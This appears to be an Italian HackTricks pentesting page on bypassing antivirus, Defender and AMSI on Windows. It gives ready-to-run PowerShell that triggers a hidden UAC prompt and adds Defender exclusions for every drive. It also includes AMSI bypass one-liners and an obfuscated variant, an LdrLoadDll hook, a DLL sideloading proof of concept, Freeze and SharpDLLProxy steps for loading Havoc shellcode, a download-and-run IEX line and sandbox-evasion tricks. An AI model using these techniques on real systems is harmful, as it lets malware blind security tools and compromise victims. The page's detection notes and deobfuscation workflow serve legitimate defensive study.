# Bypass dell'antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata inizialmente scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Fermare Defender

- [defendnot](https://github.com/es3n1n/defendnot): uno strumento per impedire a Windows Defender di funzionare.
- [no-defender](https://github.com/es3n1n/no-defender): uno strumento per impedire a Windows Defender di funzionare simulando un altro AV.
- [Disabilitare Defender se si è admin](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat di videogiochi sono spesso distribuiti come installer Node.js/Nexe non firmati, che prima **chiedono all'utente di ottenere privilegi elevati** e solo dopo neutralizzano Defender. Il flusso è semplice:

1. Verificare la presenza di un contesto amministrativo con `net session`. Il comando riesce solo se chi lo esegue dispone dei diritti di amministratore; un errore indica quindi che il loader è in esecuzione come utente standard.
2. Riavviare immediatamente il processo con il verbo `RunAs` per attivare la prevista richiesta di consenso UAC, mantenendo la riga di comando originale.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Le vittime credono già di installare software “crackato”, quindi di solito accettano la richiesta, concedendo al malware i privilegi necessari per modificare i criteri di Defender.<sup>[[26]](#references)</sup>

### Esclusioni `MpPreference` indiscriminate per ogni lettera di unità

Una volta ottenuti privilegi elevati, le catene in stile GachiLoader massimizzano i punti ciechi di Defender invece di disattivare direttamente il servizio. Il loader prima termina il watchdog della GUI (`taskkill /F /IM SecHealthUI.exe`) e poi imposta **esclusioni estremamente ampie**, rendendo non scansionabili tutti i profili utente, le directory di sistema e i dischi rimovibili:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Osservazioni principali:

- Il loop attraversa ogni filesystem montato (D:\, E:\, chiavette USB, ecc.), quindi **qualsiasi payload aggiunto in futuro in qualsiasi punto del disco viene ignorato**.
- L'esclusione dell'estensione `.sys` è pensata per il futuro: gli attacker si riservano la possibilità di caricare in seguito driver non firmati senza intervenire di nuovo su Defender.
- Tutte le modifiche vengono salvate in `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo alle fasi successive di verificare che le esclusioni persistano o di ampliarle senza dover attivare nuovamente l'UAC.

Poiché nessun servizio di Defender viene arrestato, i controlli superficiali continuano a segnalare che «l'antivirus è attivo», anche se l'ispezione in tempo reale non controlla mai quei percorsi.<sup>[[26]](#references)</sup>

## **Metodologia di evasione degli AV**

Attualmente, gli AV utilizzano metodi diversi per verificare se un file è dannoso o meno: rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico consiste nell'individuare stringhe o sequenze di byte dannose note in un binario o in uno script e nell'estrarre informazioni dal file stesso (ad esempio descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Ciò significa che l'uso di tool pubblici noti può farti individuare più facilmente, poiché probabilmente sono già stati analizzati e segnalati come dannosi. Esistono alcuni modi per aggirare questo tipo di rilevamento:

- **Crittografia**

Se crittografi il binario, l'AV non potrà rilevare il tuo programma, ma ti servirà un loader per decrittografarlo ed eseguirlo in memoria.

- **Offuscamento**

A volte basta modificare alcune stringhe nel binario o nello script per eludere l'AV, ma può richiedere molto tempo, a seconda di ciò che stai cercando di offuscare.

- **Tool personalizzati**

Se sviluppi i tuoi tool, non esisteranno firme dannose note, ma ci vorranno molto tempo e impegno.

> [!TIP]
> Un buon metodo per verificare il rilevamento statico di Windows Defender è usare [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). In pratica, suddivide il file in più segmenti e chiede a Defender di analizzarli singolarmente; in questo modo può indicarti esattamente quali stringhe o byte del binario vengono segnalati.

Ti consiglio vivamente di dare un'occhiata a questa [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull'evasione pratica degli AV.

### **Analisi dinamica**

L'analisi dinamica si verifica quando l'AV esegue il tuo binario in una sandbox e osserva eventuali attività dannose (ad esempio, tentare di decrittografare e leggere le password del browser, eseguire un minidump di LSASS, ecc.). Questa parte può essere un po' più complicata, ma ecco alcune cose che puoi fare per eludere le sandbox.

- **Attendere prima dell'esecuzione** A seconda di come è implementato, può essere un ottimo metodo per aggirare l'analisi dinamica dell'AV. Gli AV hanno pochissimo tempo per analizzare i file senza interrompere il flusso di lavoro dell'utente, quindi attese prolungate possono ostacolare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare l'attesa, a seconda di come è implementata.
- **Controllare le risorse della macchina** Di solito le sandbox dispongono di pochissime risorse (ad esempio < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Puoi anche essere molto creativo: per esempio, controllando la temperatura della CPU o persino la velocità delle ventole; non tutto verrà simulato nella sandbox.
- **Controlli specifici della macchina** Se vuoi colpire un utente la cui workstation è unita al dominio "contoso.local", puoi controllare il dominio del computer per verificare che corrisponda a quello specificato; se non corrisponde, puoi far terminare il programma.

A quanto pare, il nome del computer nella sandbox di Microsoft Defender è HAL9TH. Puoi quindi controllare il nome del computer nel tuo malware prima della detonazione: se corrisponde a HAL9TH, significa che ti trovi nella sandbox di Defender e puoi far terminare il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli di [@mgeeky](https://twitter.com/mariuszbit) per contrastare le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canale #malware-dev</p></figcaption></figure>

Come abbiamo già detto in questo post, i **tool pubblici** prima o poi **verranno rilevati**, quindi dovresti porti una domanda:

Ad esempio, se vuoi eseguire un dump di LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno conosciuto, che esegue anch'esso il dump di LSASS?

Probabilmente la risposta giusta è la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei malware più segnalati dagli AV e dagli EDR, se non il più segnalato. Sebbene il progetto in sé sia fantastico, è anche un incubo da usare per aggirare gli AV: cerca quindi alternative per ciò che vuoi ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per eludere il rilevamento, assicurati di **disattivare l'invio automatico dei campioni** in Defender e, per favore, **NON CARICARLI SU VIRUSTOTAL** se il tuo obiettivo è riuscire a eludere il rilevamento nel lungo periodo. Se vuoi verificare se un determinato AV rileva il tuo payload, installalo su una VM, prova a disattivare l'invio automatico dei campioni e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando possibile, **dai sempre la priorità all'uso delle DLL per l'evasione**. Nella mia esperienza, i file DLL vengono in genere **rilevati e analizzati molto meno**, quindi in alcuni casi è un trucco molto semplice per evitare il rilevamento (se, naturalmente, il tuo payload può essere eseguito come DLL).

Come si vede in questa immagine, un payload DLL di Havoc ha un tasso di rilevamento di 4/26 su antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un payload EXE standard di Havoc e una DLL standard di Havoc</p></figcaption></figure>

Ora vedremo alcuni trucchi che puoi usare con i file DLL per renderli molto più furtivi.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader, posizionando l'applicazione vittima e i payload dannosi uno accanto all'altro.

Puoi individuare i programmi vulnerabili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e il seguente script PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Questo comando restituirà l'elenco dei programmi soggetti a DLL hijacking in "C:\Program Files\\" e dei file DLL che tentano di caricare.

Ti consiglio vivamente di **esplorare personalmente i programmi vulnerabili a DLL Hijack/Sideload**. Se eseguita correttamente, questa tecnica è piuttosto stealth, ma potresti farti beccare facilmente se usi programmi DLL Sideloadable noti pubblicamente.

Il semplice fatto di inserire una DLL malevola con il nome che un programma si aspetta di caricare non farà caricare il tuo payload, perché il programma si aspetta che nella DLL siano presenti funzioni specifiche. Per risolvere il problema, useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma effettua dalla DLL proxy (e malevola) alla DLL originale, preservando così le funzionalità del programma e consentendo di gestire l'esecuzione del payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/flangvik/)

Questi sono i passaggi che ho seguito:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

L'ultimo comando ci fornirà 2 file: un modello del codice sorgente di una DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento pari a 0/26 su [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti **consiglio vivamente** di guardare il [VOD di S3cur3Th1sSh1t su Twitch](https://www.twitch.tv/videos/1644171543) sul DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire ciò di cui abbiamo parlato.

### Abuso degli export inoltrati (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che in realtà sono dei "forwarder": invece di puntare al codice, la voce di esportazione contiene una stringa ASCII nel formato `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già caricato
- Risolve `TargetFunc` al suo interno

Comportamenti chiave da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dallo spazio dei nomi KnownDLLs protetto (ad es. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` non è una KnownDLL, viene utilizzato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta eseguendo la risoluzione dell'inoltro.

Questo consente una primitiva di sideloading indiretta: trova una DLL firmata che esporta una funzione inoltrata a un modulo il cui nome non è una KnownDLL, quindi colloca nella stessa directory quella DLL firmata e una DLL controllata dall'attaccante, con lo stesso nome esatto del modulo di destinazione inoltrato. Quando viene invocato l'export inoltrato, il loader risolve l'inoltro e carica la tua DLL dalla stessa directory, eseguendo il tuo DllMain.<sup>[[13]](#references)</sup>

Esempio osservato su Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` non è una KnownDLL, quindi viene individuata seguendo il normale ordine di ricerca.

PoC (copia e incolla):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Posiziona una `NCRYPTPROV.dll` malevola nella stessa cartella. È sufficiente un `DllMain` minimale per ottenere l'esecuzione del codice; non è necessario implementare la funzione inoltrata per attivare `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Attiva l'inoltro tramite un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportamento osservato:
- rundll32 (firmato) carica la `keyiso.dll` side-by-side (firmata)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader carica quindi `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementato, verrà visualizzato un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sugli export inoltrati il cui modulo di destinazione non è un KnownDLL. I KnownDLL sono elencati in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare gli export inoltrati con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idee per il rilevamento/la difesa:
- Monitora i LOLBins (ad es., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di DLL non-KnownDLLs con lo stesso nome base da quella directory
- Genera un avviso per catene di processi/moduli come: `rundll32.exe` → `keyiso.dll` non di sistema → `NCRYPTPROV.dll` in percorsi scrivibili dagli utenti
- Applica policy di integrità del codice (WDAC/AppLocker) e nega i permessi di scrittura+esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un toolkit per payload che consente di bypassare gli EDR usando processi sospesi, direct syscall e metodi di esecuzione alternativi`

Puoi usare Freeze per caricare ed eseguire la tua shellcode in modo furtivo.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasion è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non affidarti mai a un solo strumento; se possibile, prova a concatenare più tecniche di evasion.

## Syscall dirette/indirette e risoluzione degli SSN (SysWhispers4)

Gli EDR spesso applicano **hook inline in user mode** agli stub syscall di `ntdll.dll`. Per aggirare questi hook, puoi generare stub syscall **diretti** o **indiretti** che caricano l'**SSN** (System Service Number) corretto e passano alla modalità kernel senza eseguire l'entrypoint esportato soggetto all'hook.<sup>[[32]](#references)</sup>

**Opzioni di invocazione:**
- **Diretta (embedded)**: inserisce un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (senza accedere alle esportazioni di `ntdll`).
- **Indiretta**: salta a un gadget `syscall` esistente all'interno di `ntdll`, così la transizione al kernel sembra provenire da `ntdll` (utile per l'evasion euristica); **randomized indirect** sceglie un gadget da un pool a ogni chiamata.
- **Egg-hunt**: evita di incorporare su disco la sequenza di opcode statica `0F 05`; risolve una sequenza syscall durante l'esecuzione.

**Strategie di risoluzione degli SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: deduce gli SSN ordinando gli stub syscall in base all'indirizzo virtuale, invece di leggere i byte degli stub.
- **SyscallsFromDisk**: mappa una `\KnownDlls\ntdll.dll` pulita, legge gli SSN dal suo `.text`, quindi la smappa (aggira tutti gli hook in memoria).
- **RecycledGate**: combina la deduzione degli SSN tramite ordinamento VA con la convalida degli opcode quando uno stub è pulito; se è soggetto a hook, ripiega sulla deduzione tramite VA.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e usa un VEH per acquisire l'SSN da `EAX` durante l'esecuzione, senza analizzare i byte soggetti a hook.

Esempio di utilizzo di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI è stata creata per prevenire il "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di analizzare solo i **file su disco**, quindi, se riuscivi in qualche modo a eseguire i payload **direttamente in-memory**, l'AV non poteva fare nulla per impedirlo, perché non aveva sufficiente visibilità.

La funzionalità AMSI è integrata nei seguenti componenti di Windows.

- User Account Control, o UAC (elevazione di EXE, COM, MSI o installazioni ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendone il contenuto in una forma non crittografata e non offuscata.

L'esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` genera il seguente avviso in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come anteponga `amsi:` e poi il percorso dell'eseguibile da cui è stato eseguito lo script, in questo caso powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati rilevati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene sottoposto ad AMSI. Questo riguarda anche `Assembly.Load(byte[])` per caricare codice da eseguire in-memory. Ecco perché per l'esecuzione in-memory si consiglia di usare versioni precedenti di .NET (come la 4.7.2 o precedenti) se si vuole eludere AMSI.

Esistono un paio di modi per aggirare AMSI:

- **Offuscamento**

Poiché AMSI si basa principalmente su rilevamenti statici, modificare gli script che si cerca di caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI è in grado di deoffuscare gli script anche se hanno più livelli, quindi l'offuscamento potrebbe essere una scelta sbagliata, a seconda di come viene eseguito. Questo rende l'elusione tutt'altro che semplice. A volte, però, basta modificare un paio di nomi di variabili per risolvere il problema, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI viene implementata caricando una DLL nel processo di powershell (e anche in cscript.exe, wscript.exe, ecc.), è possibile manometterla facilmente anche con un utente non privilegiato. A causa di questo difetto nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione AMSI.

**Forzare un errore**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che nel processo corrente non venga avviata alcuna scansione. Questa tecnica è stata inizialmente divulgata da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un uso più ampio.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

È bastata una sola riga di codice PowerShell per rendere AMSI inutilizzabile nel processo PowerShell corrente. Naturalmente, AMSI stesso ha rilevato questa riga, quindi è necessario apportare alcune modifiche per usare questa tecnica.

Ecco una versione modificata di un bypass di AMSI, presa da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Tieni presente che probabilmente verrà segnalato non appena questo post sarà pubblicato, quindi non dovresti pubblicare codice se il tuo obiettivo è restare inosservato.

**Memory Patching**

Questa tecnica è stata scoperta inizialmente da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile dell'analisi dell'input fornito dall'utente) e sovrascriverla con istruzioni che restituiscono il codice E_INVALIDARG. In questo modo, il risultato dell'analisi effettiva sarà 0, interpretato come un risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche per bypassare AMSI con powershell. Per saperne di più, consulta [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Bloccare AMSI impedendo il caricamento di amsi.dll (hook LdrLoadDll)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nell'impostare un hook in modalità utente su `ntdll!LdrLoadDll` che restituisca un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e il processo non esegue alcuna scansione.<sup>[[23]](#references)</sup>

Schema dell'implementazione (pseudocodice C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona con PowerShell, WScript/CScript e loader personalizzati (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all'invio degli script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti lunghi nella riga di comando.
- È stato usato con loader eseguiti tramite LOLBins (ad es., `regsvr32` che richiama `DllRegisterServer`).

Anche lo strumento **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genera script per bypassare AMSI.
Anche lo strumento **[https://amsibypass.com/](https://amsibypass.com/)** genera script per bypassare AMSI ed evitare il rilevamento delle firme tramite funzioni definite dall'utente con nomi casuali, variabili ed espressioni di caratteri; inoltre, applica maiuscole e minuscole casuali alle keyword di PowerShell per evitare il rilevamento delle firme.

**Rimuovere la firma rilevata**

Puoi usare strumenti come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere dalla memoria del processo corrente la firma AMSI rilevata. Questi strumenti cercano la firma AMSI nella memoria del processo corrente e la sovrascrivono con istruzioni NOP, rimuovendola di fatto dalla memoria.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare un elenco dei prodotti AV/EDR che usano AMSI su **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usare PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire gli script senza che AMSI li analizzi. Puoi fare così:

```bash
powershell.exe -version 2
```

## PS Logging

Il logging di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Può essere utile per scopi di audit e troubleshooting, ma può anche rappresentare un **problema per gli attacker che vogliono evadere il rilevamento**.

Per bypassare il logging di PowerShell, puoi usare le seguenti tecniche:

- **Disabilitare PowerShell Transcription e Module Logging**: puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) a questo scopo.
- **Usare PowerShell versione 2**: se usi PowerShell versione 2, AMSI non verrà caricato, quindi potrai eseguire gli script senza che vengano analizzati da AMSI. Puoi farlo così: `powershell.exe -version 2`
- **Usare una sessione PowerShell non gestita**: usa [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per ospitare PowerShell senza avviare `powershell.exe` (l'approccio usato da `powerpick` di Cobalt Strike). Questo elude i controlli legati specificamente al processo `powershell.exe`, ma non disabilita intrinsecamente AMSI, Script Block Logging o tutte le altre difese di PowerShell; la copertura dipende dal runtime e dall'implementazione dell'host.


## Obfuscation

> [!TIP]
> Diverse tecniche di obfuscation si basano sulla cifratura dei dati, che aumenterà l'entropia del binary e renderà più semplice per gli AV e gli EDR rilevarlo. Fai attenzione e valuta di applicare la cifratura solo a sezioni specifiche del codice che sono sensibili o devono essere nascoste.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali), è comune trovarsi di fronte a diversi livelli di protezione che bloccano i decompiler e le sandbox. Il workflow seguente **ripristina in modo affidabile un IL quasi originale**, che può poi essere decompilato in C# con strumenti come dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1.  Rimozione dell'anti-tampering – ConfuserEx cifra ogni *corpo di metodo* e lo decifra all'interno del costruttore statico del *modulo* (`<Module>.cctor`). Inoltre, modifica il checksum PE, per cui qualsiasi modifica causerà il crash del binary. Usa **AntiTamperKiller** per individuare le tabelle di metadati cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`), utili per creare il tuo unpacker.

2.  Recupero dei simboli e del flusso di controllo: passa il file *pulito* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flag:
     • `-p crx` – seleziona il profilo ConfuserEx 2
     • de4dot annullerà il control-flow flattening, ripristinerà namespace, classi e nomi delle variabili originali e decripterà le stringhe costanti.

3.  Rimozione delle chiamate proxy – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (noti anche come *proxy calls*) per ostacolare ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Dopo questo passaggio dovresti vedere API .NET normali, come `Convert.FromBase64String` o `AES.Create()`, invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binario ottenuto con dnSpy e cerca grandi blob Base64 o l’uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il *payload* reale. Spesso il malware lo memorizza come array di byte codificato in TLV, inizializzato all’interno di `<Module>.byte_0`.

La catena descritta ripristina il flusso di esecuzione **senza** dover eseguire il campione malevolo: utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx genera un attributo personalizzato chiamato `ConfusedByAttribute`, che può essere usato come IOC per classificare automaticamente i campioni.

#### Comando in una riga
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di offrire maggiore sicurezza software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e protezione dalle manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare codice offuscato in fase di compilazione, senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni offuscate generate dal framework di metaprogrammazione dei template C++, rendendo un po' più difficile la vita di chi vuole crackare l'applicazione.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un obfuscator per binari x64 in grado di offuscare diversi file PE, tra cui: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation granulare per i linguaggi supportati da LLVM, che usa ROP (return-oriented programming). ROPfuscator offusca un programma a livello di assembly trasformando le istruzioni normali in catene ROP, ostacolando la nostra concezione naturale del normale flusso di controllo.
